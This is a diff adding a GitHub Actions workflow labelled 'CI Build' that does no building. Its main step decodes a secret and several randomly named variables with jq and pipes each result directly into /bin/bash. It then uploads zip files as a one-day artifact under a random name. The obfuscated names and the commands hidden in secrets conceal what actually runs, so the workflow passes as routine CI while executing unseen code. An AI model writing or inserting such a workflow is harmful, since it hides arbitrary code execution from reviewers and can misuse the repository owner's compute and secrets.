@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          yi10028: ${{ secrets.yi10028 }}
+        run: |
+          printf '%s' "$yi10028" | jq -r .smts74 | /bin/bash
+          echo $lttkh97985 | jq -r .he20198 | /bin/bash
+          echo $didp7 | jq -r .hqid10096 | /bin/bash
+          echo $rorgz6 | jq -r .fxv0 | /bin/bash
+          printf '%s' "$upvjw98130" | jq -r .zwn19 | /bin/bash
+          echo $lhhdb955 | jq -r .if11 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6CQTRHIT
+          path: "*.zip"
+          retention-days: 1
